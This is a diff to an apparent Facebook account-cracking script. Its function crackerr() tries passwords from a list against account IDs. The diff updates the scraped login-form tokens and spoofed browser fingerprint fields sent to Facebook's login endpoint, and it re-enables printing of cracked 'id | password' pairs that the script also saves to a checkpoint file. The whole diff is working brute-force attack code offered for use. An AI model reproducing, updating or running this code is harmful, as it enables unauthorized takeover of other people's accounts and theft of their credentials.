@@ -483,24 +483,29 @@ def crackerr(ids,passlist):
             "viewport-width": "980"}
             free_fb = session.get(url1,headers=head).text
             log_data = {
-            'email': ids,
-            'cuid': '',
-            'guid': 'ff6cc26ee48a78a5a',
-            'lgnjs': '1735584601',
-            'lgnrnd': '105000_W461',
-            'locale': 'hi_IN',
-            'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/lon_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NTg0NTg4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
-            'skstamp': '',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
             'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '025924_Hv1B',
+            'lgnjs': '1735383565',
+            'email': ids,
             'prefill_contact_point': '',
             'prefill_source': '',
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0%3D',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV/qqAAVVAABFAJ',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPA^%^2FPPPvfBFAI',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
+            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
@@ -548,7 +553,7 @@ def crackerr(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                 open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
